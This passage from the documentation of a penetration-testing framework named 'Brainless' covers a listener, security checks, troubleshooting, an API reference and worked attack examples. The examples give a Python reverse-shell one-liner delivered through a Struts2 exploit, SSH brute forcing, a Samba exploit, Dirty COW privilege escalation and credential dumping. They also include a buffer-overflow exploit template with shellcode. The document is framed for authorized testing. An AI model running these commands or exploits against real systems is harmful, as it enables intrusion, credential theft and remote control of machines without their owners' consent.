            
            self.running = True
            
            # Accept connections
            while self.running:
                if self.protocol in ['tcp', 'ssl']:
                    client_socket, address = sock.accept()
                    
                    if self.protocol == 'ssl':
                        threading.Thread(
                            target=self.handle_ssl_connection,
                            args=(client_socket, address),
                            daemon=True
                        ).start()
                    else:
                        threading.Thread(
                            target=self.handle_tcp_connection,
                            args=(client_socket, address),
                            daemon=True
                        ).start()
                
                elif self.protocol == 'udp':
                    data, address = sock.recvfrom(1024)
                    # Handle UDP data
                    
        except Exception as e:
            self.error(f"Listener error: {e}")
        finally:
            self.running = False
            if 'sock' in locals():
                sock.close()
    
    def stop(self):
        """Stop the listener"""
        self.running = False
        # Close all sessions
        for session_id in list(self.sessions.keys()):
            self.close_session(session_id)
    
    def run(self, options=None):
        if options:
            for key, value in options.items():
                self.set_option(key, value)
        
        try:
            self.start()
            return {'success': True, 'message': 'Listener started'}
        except Exception as e:
            return {'success': False, 'error': str(e)}

def run(options=None):
    listener = MultiProtocolListener()
    return listener.run(options)
```

---

## Security Considerations

### Framework Security

#### 1. Module Sandboxing
```python
# Framework automatically validates modules
# before loading and execution

class SecureModuleLoader(ModuleLoader):
    def validate_module(self, module):
        """Enhanced module validation"""
        
        # Check for dangerous imports
        dangerous_modules = ['os', 'sys', 'subprocess', 'socket']
        module_source = inspect.getsource(module)
        
        for dangerous in dangerous_modules:
            if f"import {dangerous}" in module_source:
                self.logger.warning(f"Module uses {dangerous} - extra caution advised")
        
        # Check for network operations
        if 'socket' in module_source or 'requests' in module_source:
            self.logger.info("Module performs network operations")
        
        return True
```

#### 2. Input Validation
```python
def validate_target(target):
    """Validate target specification"""
    import ipaddress
    
    try:
        # Check if it's a valid IP or network
        if '/' in target:
            ipaddress.ip_network(target, strict=False)
        else:
            ipaddress.ip_address(target)
        
        return True
    except ValueError:
        return False

def validate_port(port):
    """Validate port number"""
    try:
        port = int(port)
        return 1 <= port <= 65535
    except ValueError:
        return False
```

#### 3. Permission Checks
```python
def check_privileges():
    """Check if running with sufficient privileges"""
    import os
    
    if os.geteuid() != 0:
        print("Warning: Not running as root")
        print("Some modules may not work properly")
        return False
    return True

def check_network_access(target):
    """Check if target is in allowed networks"""
    allowed_networks = [
        "10.0.0.0/8",
        "172.16.0.0/12", 
        "192.168.0.0/16",
        "127.0.0.0/8"
    ]
    
    import ipaddress
    
    target_ip = ipaddress.ip_address(target)
    
    for network in allowed_networks:
        if target_ip in ipaddress.ip_network(network):
            return True
    
    print(f"Warning: Target {target} not in allowed networks")
    return False
```

### User Security Practices

#### 1. Legal Authorization
Always ensure you have proper authorization:

```python
# Before starting any assessment:
# 1. Obtain written permission
# 2. Define scope and boundaries
# 3. Establish rules of engagement
# 4. Document everything

def check_authorization():
    """Verify authorization exists"""
    auth_file = "AUTHORIZATION.txt"
    
    if not os.path.exists(auth_file):
        print("ERROR: No authorization file found")
        print("Please create AUTHORIZATION.txt with client approval")
        return False
    
    # Check authorization details
    with open(auth_file, 'r') as f:
        content = f.read()
        
    required_fields = ['client', 'scope', 'dates', 'authorized_by']
    
    for field in required_fields:
        if field not in content.lower():
            print(f"WARNING: {field} not found in authorization")
    
    return True
```

#### 2. Data Protection
```python
def encrypt_sensitive_data(data, key):
    """Encrypt sensitive findings"""
    from cryptography.fernet import Fernet
    
    # Generate key from password
    key = Fernet.generate_key()
    cipher = Fernet(key)
    
    # Encrypt data
    encrypted = cipher.encrypt(data.encode())
    
    return encrypted, key

def secure_file_wipe(filepath):
    """Securely delete sensitive files"""
    import os
    
    # Overwrite file multiple times
    with open(filepath, 'ba+') as f:
        length = f.tell()
        for _ in range(3):
            f.seek(0)
            f.write(os.urandom(length))
    
    # Delete file
    os.remove(filepath)
```

#### 3. Anonymization
```python
def anonymize_report(report_data):
    """Remove sensitive information from reports"""
    
    # Replace IP addresses
    import re
    
    ip_pattern = r'\b(?:\d{1,3}\.){3}\d{1,3}\b'
    report_data = re.sub(ip_pattern, 'XXX.XXX.XXX.XXX', report_data)
    
    # Replace hostnames
    hostname_pattern = r'\b[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}\b'
    report_data = re.sub(hostname_pattern, 'example.com', report_data)
    
    # Replace usernames
    username_pattern = r'\b[a-zA-Z][a-zA-Z0-9_]{2,}\b'
    report_data = re.sub(username_pattern, 'user', report_data)
    
    return report_data
```

---

## Troubleshooting

### Common Issues and Solutions

#### 1. Module Import Errors
**Problem**: `ModuleNotFoundError: No module named 'paramiko'`

**Solution**:
```bash
# Install missing dependency
pip3 install paramiko

# Or install all dependencies
pip3 install -r requirements.txt

# For system-wide installation
sudo pip3 install paramiko
```

#### 2. Permission Denied
**Problem**: `PermissionError: [Errno 13] Permission denied`

**Solution**:
```bash
# Make script executable
chmod +x brainless.py

# Run with sudo if needed
sudo python3 brainless.py

# Check file permissions
ls -la brainless.py
```

#### 3. Network Connection Issues
**Problem**: `Connection refused` or `Timeout`

**Solution**:
```bash
# Check network connectivity
ping target_ip

# Check firewall settings
sudo ufw status
sudo iptables -L

# Verify target service
nmap -p port target_ip

# Check network interface
ip addr show
```

#### 4. Python Path Issues
**Problem**: Modules not found despite being present

**Solution**:
```bash
# Check Python path
python3 -c "import sys; print(sys.path)"

# Add framework to path
export PYTHONPATH="${PYTHONPATH}:/path/to/brainless-framework"

# Verify module can be imported
python3 -c "from core.engine import BrainlessEngine; print('OK')"
```

#### 5. Configuration Errors
**Problem**: Framework doesn't start or behaves unexpectedly

**Solution**:
```bash
# Reset configuration
mv config/brainless.conf config/brainless.conf.backup

# Restart framework (will create default config)
python3 brainless.py

# Manually edit configuration if needed
nano config/brainless.conf
```

### Debug Mode

Enable debug mode for detailed troubleshooting:

```bash
# Start with verbose output
python3 brainless.py --verbose

# Enable debug logging in code
import logging
logging.basicConfig(level=logging.DEBUG)
```

### Log Analysis

Check framework logs for errors:

```bash
# View recent logs
tail -f logs/brainless.log

# Search for errors
grep -i error logs/brainless.log

# Check specific module logs
grep "ModuleName" logs/brainless.log
```

### Performance Issues

#### Slow Module Loading
```python
# Check module count
engine = BrainlessEngine()
module_count = engine.load_all_modules()
print(f"Loaded {module_count} modules")

# Disable auto-loading if too slow
# In config: auto_load = false
```

#### High Memory Usage
```python
import psutil

# Monitor memory usage
process = psutil.Process()
memory_mb = process.memory_info().rss / 1024 / 1024
print(f"Memory usage: {memory_mb:.2f} MB")

# Clear module cache if needed
import sys
modules_to_remove = [m for m in sys.modules if 'brainless' in m]
for module in modules_to_remove:
    del sys.modules[module]
```

### Network Troubleshooting

#### Port Binding Issues
```bash
# Check if port is in use
sudo netstat -tlnp | grep :4444
sudo lsof -i :4444

# Kill conflicting process
sudo kill -9 <pid>

# Use different port
python3 brainless.py
brainless > set LPORT 4445
```

#### DNS Resolution Issues
```bash
# Check DNS configuration
cat /etc/resolv.conf

# Test DNS resolution
nslookup example.com
dig example.com

# Use IP addresses instead of hostnames
```

### Module-Specific Issues

#### SSH Module Issues
```bash
# Check SSH client
ssh -V

# Test manual connection
ssh user@target

# Check paramiko installation
python3 -c "import paramiko; print(paramiko.__version__)"
```

#### Web Module Issues
```bash
# Check if requests is installed
python3 -c "import requests; print(requests.__version__)"

# Test basic HTTP request
python3 -c "import requests; print(requests.get('http://example.com').status_code)"
```

### Framework Recovery

#### Reset Framework State
```bash
# Stop all processes
pkill -f brainless

# Clear temporary files
rm -rf /tmp/brainless_*
rm -rf *.pyc
rm -rf __pycache__

# Restart framework
python3 brainless.py
```

#### Reinstall Framework
```bash
# Backup custom modules
cp -r modules/custom /backup/

# Clean remove
rm -rf brainless-framework/

# Fresh install
git clone https://github.com/brainless-security/brainless-framework.git
cd brainless-framework
pip3 install -r requirements.txt

# Restore custom modules
cp -r /backup/* modules/custom/
```

---

## API Reference

### Core Classes

#### BrainlessEngine
Main framework engine class.

**Methods**:
```python
class BrainlessEngine:
    def __init__(self, config_path='config/brainless.conf')
    def load_all_modules(self) -> int
    def get_module(self, module_path: str) -> Module
    def get_modules_by_type(self, module_type: str) -> dict
    def create_session(self, session_type: str, **kwargs) -> str
    def get_session(self, session_id: str) -> Session
    def list_sessions(self) -> list
    def remove_session(self, session_id: str)
    def execute_module(self, module_path: str, options: dict) -> dict
    def get_framework_info(self) -> dict
    def shutdown()
```

#### ModuleLoader
Handles dynamic module loading.

**Methods**:
```python
class ModuleLoader:
    def __init__(self, modules_directory: str, config=None)
    def load_all_modules(self) -> dict
    def get_module(self, module_path: str) -> Module
    def get_modules_by_type(self, module_type: str) -> dict
    def reload_module(self, module_path: str) -> bool
    def reload_all_modules(self) -> int
    def search_modules(self, keyword: str, module_type=None) -> list
    def get_module_info(self, module_path: str) -> dict
```

#### SessionManager
Manages framework sessions.

**Methods**:
```python
class SessionManager:
    def __init__(self, config)
    def create_session(self, session_type: str, **kwargs) -> str
    def get_session(self, session_id: str) -> Session
    def list_sessions(self) -> list
    def remove_session(self, session_id: str)
    def get_session_count(self) -> int
    def cleanup()
```

#### LoggerMixin
Base class for logging functionality.

**Methods**:
```python
class LoggerMixin:
    def __init__(self, name: str)
    def debug(self, message: str)
    def info(self, message: str)
    def warning(self, message: str)
    def error(self, message: str)
    def critical(self, message: str)
    def success(self, message: str)
```

### Module Interface

#### Required Attributes
```python
NAME = "Module Name"                    # Display name
DESCRIPTION = "Module description"      # Brief description
AUTHOR = "Author Name"                  # Module author
VERSION = "1.0"                         # Module version
RANK = "excellent"                      # Impact rating
MODULE_TYPE = "exploit"                 # Module category
```

#### Required Functions
```python
def run(options: dict = None) -> dict:
    """
    Main module execution function
    
    Args:
        options: Dictionary of module options
        
    Returns:
        Dictionary with execution results
    """
    pass
```

#### Optional Functions
```python
def set_option(option: str, value: str):
    """Set module option"""
    pass

def get_options() -> dict:
    """Get available options"""
    return {}

def check_dependencies() -> bool:
    """Check if module dependencies are met"""
    return True
```

### Session Interface

#### Session Methods
```python
class Session:
    def __init__(self, session_id: str, session_type: str, **kwargs)
    def execute_command(self, command: str) -> str
    def upload_file(self, local_path: str, remote_path: str) -> dict
    def download_file(self, remote_path: str) -> dict
    def get_info(self) -> dict
    def is_active(self) -> bool
    def close()
```

### Configuration Options

#### Framework Configuration
```ini
[framework]
version = 0.1
author = Brainless Security Team
description = Modular penetration testing framework

[cli]
prompt = "brainless > "
prompt_color = "cyan"
banner = true
history_file = ".brainless_history"
max_history = 1000

[modules]
modules_directory = "modules"
exploits_directory = "modules/exploits"
payloads_directory = "modules/payloads"
auxiliary_directory = "modules/auxiliary"
post_directory = "modules/post"
auto_load = true
validate_metadata = true

[logging]
level = "INFO"
file = "logs/brainless.log"
max_file_size = 10485760
backup_count = 5
format = "%(asctime)s - %(name)s - %(levelname)s - %(message)s"
console_output = true

[security]
require_root = false
sandbox_modules = true
validate_dependencies = true
allowed_networks = ["10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16", "127.0.0.0/8"]
restrict_external_calls = true

[database]
enabled = false
type = "sqlite"
name = "brainless.db"
auto_connect = false

[updates]
check_updates = true
update_channel = "stable"
last_update_check = ""
auto_update = false
```

---

## Examples and Use Cases

### Example 1: Web Application Assessment

#### Scenario
Assessing a web application for common vulnerabilities.

#### Steps
```bash
# 1. Start framework
python3 brainless.py

# 2. Enumerate web application
brainless > use auxiliary/web/http_enum
brainless exploit(http_enum) > set TARGET example.com
brainless exploit(http_enum) > set PORT 80
brainless exploit(http_enum) > run

# 3. Test for Struts2 vulnerability
brainless > use exploits/linux/apache/struts2_cve_2017_5638
brainless exploit(struts2) > set TARGET_URL http://example.com/struts2-app/
brainless exploit(struts2) > set COMMAND id
brainless exploit(struts2) > run

# 4. Set up reverse shell
brainless > use listeners/multi_handler
brainless exploit(multi_handler) > set LHOST 192.168.1.10
brainless exploit(multi_handler) > set LPORT 4444
brainless exploit(multi_handler) > run

# 5. Generate payload
brainless > use payloads/meterpreter_reverse_tcp
brainless exploit(meterpreter_reverse_tcp) > set LHOST 192.168.1.10
brainless exploit(meterpreter_reverse_tcp) > set LPORT 4444
brainless exploit(meterpreter_reverse_tcp) > run

# 6. Exploit with payload
brainless > use exploits/linux/apache/struts2_cve_2017_5638
brainless exploit(struts2) > set TARGET_URL http://example.com/struts2-app/
brainless exploit(struts2) > set COMMAND "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"192.168.1.10\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
brainless exploit(struts2) > run

# 7. Post-exploitation
brainless > sessions -i 1
brainless session(1) > use post/linux/credential_dump
brainless exploit(credential_dump) > run

# 8. Generate report
brainless > use auxiliary/reporting/generate_report
brainless exploit(generate_report) > set OUTPUT_FORMAT html
brainless exploit(generate_report) > set OUTPUT_FILE web_assessment_report.html
brainless exploit(generate_report) > run
```

### Example 2: Internal Network Penetration

#### Scenario
Simulating an internal network penetration test.

#### Steps
```bash
# 1. Network reconnaissance
brainless > use auxiliary/scanner/port_scanner
brainless exploit(port_scanner) > set TARGET 192.168.1.0/24
brainless exploit(port_scanner) > set PORTS 1-1000
brainless exploit(port_scanner) > set THREADS 200
brainless exploit(port_scanner) > run

# 2. Identify high-value targets
# Based on scan results, focus on servers with SSH, SMB, databases

# 3. SSH credential testing
brainless > use auxiliary/cracker/ssh_bruteforce
brainless exploit(ssh_bruteforce) > set TARGET 192.168.1.100
brainless exploit(ssh_bruteforce) > set USERNAMES admin,root,oracle,mysql
brainless exploit(ssh_bruteforce) > set PASSWORDS password,admin,123456,welcome
brainless exploit(ssh_bruteforce) > set STRATEGY hybrid
brainless exploit(ssh_bruteforce) > run

# 4. Exploit Samba vulnerability
brainless > use exploits/linux/samba/cve_2017_7494
brainless exploit(cve_2017_7494) > set RHOST 192.168.1.50
brainless exploit(cve_2017_7494) > set RPORT 445
brainless exploit(cve_2017_7494) > set PAYLOAD reverse_tcp
brainless exploit(cve_2017_7494) > set LHOST 192.168.1.10
brainless exploit(cve_2017_7494) > set LPORT 4445
brainless exploit(cve_2017_7494) > run

# 5. Privilege escalation
brainless > sessions -i 1
brainless session(1) > use exploits/linux/local/dirty_cow
brainless exploit(dirty_cow) > set TARGET_FILE /etc/passwd
brainless exploit(dirty_cow) > set PAYLOAD_USER rootme
brainless exploit(dirty_cow) > run

# 6. Lateral movement
# Use compromised credentials to access other systems

# 7. Data exfiltration simulation
brainless session(1) > use post/linux/credential_dump
brainless exploit(credential_dump) > set INCLUDE_SENSITIVE true
brainless exploit(credential_dump) > run

# 8. Cleanup and reporting
brainless > use auxiliary/reporting/generate_report
brainless exploit(generate_report) > set INCLUDE_EXECUTIVE_SUMMARY true
brainless exploit(generate_report) > set INCLUDE_RECOMMENDATIONS true
brainless exploit(generate_report) > run
```

### Example 3: Wireless Network Assessment

#### Scenario
Assessing wireless network security.

#### Steps
```bash
# 1. Check for wireless interfaces
brainless > !iwconfig

# 2. Scan for wireless networks
brainless > use auxiliary/wireless/wifi_scanner
brainless exploit(wifi_scanner) > set INTERFACE wlan0
brainless exploit(wifi_scanner) > set DURATION 60
brainless exploit(wifi_scanner) > set MONITOR_MODE true
brainless exploit(wifi_scanner) > run

# 3. Analyze findings
# Identify open networks, weak encryption, hidden SSIDs

# 4. Test client connections (if authorized)
# Useaireplay-ng, aircrack-ng tools for testing

# 5. Document findings
brainless > use auxiliary/reporting/generate_report
brainless exploit(generate_report) > set DATA '{"wireless_findings": [...]}'
brainless exploit(generate_report) > run
```

### Example 4: Custom Module Development

#### Scenario
Creating a custom module for a specific vulnerability.

#### Development Process
```python
# 1. Research the vulnerability
# Understand the attack vector, requirements, and impact

# 2. Create module structure
#!/usr/bin/env python3
"""
Custom Vulnerability Exploit
============================

Exploits CVE-2023-XXXX in Example Application.

Author: Your Name
Module: exploits/linux/applications/example_app
Type: exploit
Rank: excellent
"""

import socket
import struct
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent.parent))
from core.logger import LoggerMixin

NAME = "Example Application Buffer Overflow"
DESCRIPTION = "Exploits buffer overflow in Example Application 2.0"
AUTHOR = "Your Name"
VERSION = "1.0"
RANK = "excellent"
MODULE_TYPE = "exploit"

class ExampleAppExploit(LoggerMixin):
    def __init__(self):
        super().__init__('ExampleAppExploit')
        self.target_host = None
        self.target_port = 8080
        self.timeout = 10
        self.shellcode = self.generate_shellcode()
        
    def set_option(self, option, value):
        if option.lower() == 'rhost':
            self.target_host = value
        elif option.lower() == 'rport':
            self.target_port = int(value)
        elif option.lower() == 'timeout':
            self.timeout = int(value)
    
    def get_options(self):
        return {
            'RHOST': {'description': 'Target host IP', 'required': True, 'default': ''},
            'RPORT': {'description': 'Target port', 'required': False, 'default': '8080'},
            'TIMEOUT': {'description': 'Connection timeout', 'required': False, 'default': '10'}
        }
    
    def generate_shellcode(self):
        """Generate custom shellcode"""
        # Platform-specific shellcode for reverse shell
        # This is a simplified example
        shellcode = (
            b"\x31\xc0\x50\x68\x2f\x2f\x73\x68"
            b"\x68\x2f\x62\x69\x6e\x89\xe3\x50"
            b"\x53\x89\xe1\xb0\x0b\xcd\x80"
        )
        return shellcode
    
    def create_exploit_buffer(self):
        """Create exploit buffer with proper padding and return address"""
        # Calculate offsets based on vulnerability analysis
        padding = b"A" * 260  # Adjust based on actual offset
        ret_addr = struct.pack('<I', 0xbffff410)  # Adjust based on target
        
        # NOP sled
        nop_sled = b"\x90" * 16
        
        # Construct buffer
        buffer = nop_sled + self.shellcode + padding + ret_addr
        
        return buffer
    
    def check_vulnerability(self):
        """Check if target is vulnerable"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((self.target_host, self.target_port))
            
            # Send test payload
            test_payload = b"TEST" + b"A" * 100
            sock.send(test_payload)
            
            response = sock.recv(1024)
            sock.close()
            
            # Check for crash or specific response
            return True
            
        except Exception as e:
            self.error(f"Vulnerability check failed: {e}")
            return False
    
    def run(self, options=None):
        if not self.target_host:
            return {'success': False, 'message': 'RHOST not specified'}
        
        try:
            self.info(f"Exploiting {self.target_host}:{self.target_port}")
            
            # Check vulnerability
            if not self.check_vulnerability():
                return {'success': False, 'message': 'Target not vulnerable'}
            
            # Create exploit buffer
            exploit_buffer = self.create_exploit_buffer()
            
            # Connect and send exploit
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((self.target_host, self.target_port))
            
            self.info("Sending exploit payload...")
            sock.send(exploit_buffer)
            
            # Check for successful exploitation
            try:
                sock.settimeout(5)
                response = sock.recv(1024)
                sock.close()
                
                # Check if we got a shell or specific response
                if b"root@" in response or b"#" in response:
                    self.success("Exploit successful!")
                    return {
                        'success': True,
                        'message': 'Exploit completed successfully',
                        'target': self.target_host,
                        'port': self.target_port
                    }
                else:
                    return {'success': False, 'message': 'Exploit failed'}
                    
            except socket.timeout:
                # No response might indicate successful exploit
                sock.close()
                self.warning("Connection timeout - possible successful exploit")
                return {
                    'success': True,
                    'message': 'Exploit sent (verify manually)',
                    'target': self.target_host
                }
        
        except Exception as e:
            self.error(f"Exploit failed: {e}")
            return {'success': False, 'message': f'Exploit failed: {str(e)}'}

def run(options=None):
    exploit = ExampleAppExploit()
    if options:
        for key, value in options.items():
            exploit.set_option(key, value)
    return exploit.run()
```

#### Testing the Module
```bash
# 1. Place module in appropriate directory
cp example_app_exploit.py modules/exploits/linux/applications/

# 2. Test module loading
python3 brainless.py
brainless > search example_app
brainless > use exploits/linux/applications/example_app_exploit

# 3. Test with vulnerable application
# Set up test environment with vulnerable application
# Run exploit against test target

# 4. Verify functionality
brainless exploit(example_app_exploit) > set RHOST 192.168.1.100
brainless exploit(example_app_exploit) > run
```

---

## Contributing

### Getting Started

#### 1. Fork and Clone
```bash
# Fork the repository on GitHub
# Clone your fork
git clone https://github.com/your-username/brainless-framework.git
cd brainless-framework

# Add upstream repository
git remote add upstream https://github.com/brainless-security/brainless-framework.git
```

#### 2. Set Up Development Environment
```bash
# Create branch for your feature
git checkout -b feature-name

# Make your changes
# Add tests for your changes
# Update documentation if needed
```

#### 3. Code Guidelines
- Follow Python PEP 8 style guidelines
- Use meaningful variable and function names
- Add comprehensive docstrings
- Include error handling
- Write tests for new functionality
- Update module metadata appropriately

#### 4. Testing
```bash
# Run framework tests
python3 -m pytest tests/

# Test your module
python3 brainless.py
brainless > use your_module
brainless > run

# Check for errors
python3 -m py_compile your_module.py
```

#### 5. Submit Pull Request
```bash
# Commit your changes
git add .
git commit -m "Description of changes"

# Push to your fork
git push origin feature-name

# Create pull request on GitHub
```

### Contribution Areas

#### 1. New Modules
- Exploit modules for newly discovered vulnerabilities
- Payload modules with new techniques
- Auxiliary modules for reconnaissance
- Post-exploitation modules

#### 2. Framework Improvements
- Performance optimizations
- New features and capabilities
- Enhanced security measures
- Better error handling

#### 3. Documentation
- Update and improve documentation
- Add examples and use cases
- Create tutorials and guides
- Improve module documentation

#### 4. Testing
- Add unit tests
- Create integration tests
- Test on different platforms
- Verify security measures

### Module Submission Guidelines

#### 1. Module Requirements
- Must follow framework structure
- Include proper metadata
- Have comprehensive documentation
- Handle errors gracefully
- Be tested before submission

#### 2. Security Review
- No hardcoded credentials
- Proper input validation
- Safe default configurations
- No malicious functionality

#### 3. Documentation Requirements
- Clear module description
- Usage examples
- Required options and defaults
- Dependencies and requirements
- Risk assessment and warnings

### Reporting Issues

#### Bug Reports
When reporting bugs, include:
- Framework version
- Python version
- Operating system
- Steps to reproduce
- Expected vs. actual behavior
- Error messages and logs

#### Security Issues
For security vulnerabilities:
- Email security@brainless.security
- Do not disclose publicly
- Include proof of concept if possible
- Allow time for fix before disclosure

#### Feature Requests
For new features:
- Clear description of the feature
- Use case and benefits
- Implementation suggestions
- Compatibility considerations

### Community Guidelines

#### Code of Conduct
- Be respectful and inclusive
- Help others learn and grow
- Share knowledge and experience
- Constructive criticism only
- No harassment or discrimination

#### Communication
- Use GitHub Issues for bugs and features
- Join discussions and help others
- Share your experiences and knowledge
- Be patient and understanding

---

## Conclusion

Brainless Framework provides a comprehensive, professional-grade platform for penetration testing and security research. With its modular architecture, extensive module library, and powerful features, it enables security professionals to conduct thorough assessments efficiently and effectively.

### Key Takeaways

1. **Modular Design**: Easy to extend and customize
2. **Comprehensive Modules**: Wide range of exploits, payloads, and tools
3. **Professional Features**: Session management, reporting, and more
4. **Security Focused**: Built with security best practices
5. **Community Driven**: Open source with active development

### Next Steps

1. **Explore the Framework**: Try different modules and features
2. **Develop Custom Modules**: Create modules for your specific needs
3. **Contribute**: Share your improvements with the community
4. **Stay Updated**: Follow updates and new releases
5. **Practice Responsibly**: Always use in authorized environments

### Additional Resources

- **GitHub Repository**: https://github.com/brainless-security/brainless-framework
- **Documentation**: [README.md](README.md), [INSTALL.md](INSTALL.md)
- **Examples**: See `examples/` directory for additional use cases
- **Community**: Join discussions and contribute

---

**Brainless Framework** - Professional penetration testing made accessible

*For the latest updates and additional resources, visit our GitHub repository.*
